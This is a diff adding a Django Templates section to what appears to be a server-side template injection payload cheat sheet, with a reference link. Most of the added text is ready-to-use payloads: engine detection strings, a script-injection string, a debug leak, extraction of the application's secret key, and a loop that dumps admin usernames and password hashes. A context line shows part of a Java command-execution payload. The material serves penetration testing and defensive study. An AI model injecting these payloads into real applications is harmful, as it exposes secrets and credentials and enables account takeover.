@@ -33,6 +33,7 @@
     - [Java - Basic injection](#java---basic-injection)
     - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+  - [Django Template](#django-template)
   - [Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
     - [Jinja2 - Template format](#jinja2---template-format)
@@ -336,6 +337,67 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```
 
 ---
+
+## Django Templates
+
+Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
+
+### Detection
+
+
+```python
+{% csrf_token %} # Causes error with Jinja2
+{{ 7*7 }}  # Error with Django Templates
+ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
+```
+
+### Django Templates for post-exploitation
+
+```python
+# Variables
+{{ variable }}
+{{ variable.attr }}
+
+# Filters
+{{ value|length }}
+
+# Tags
+{% csrf_token %}
+```
+
+### Cross-site scripting
+
+```python
+{{ '<script>alert(3)</script>' }}
+{{ '<script>alert(3)</script>' | safe }}
+```
+
+### Debug information leak
+
+```python
+{% debug %}
+```
+
+### Leaking app’s Secret Key
+
+```python
+{{ messages.storages.0.signer.key }}
+```
+
+### Admin Site URL leak
+
+
+```
+{% include 'admin/base.html' %}
+```
+
+### Admin username and password hash leak
+
+
+```
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+```
 
 ## Jinja2
 
@@ -893,3 +955,4 @@ $str.valueOf($chr.toChars($out.read()))
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
+* [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
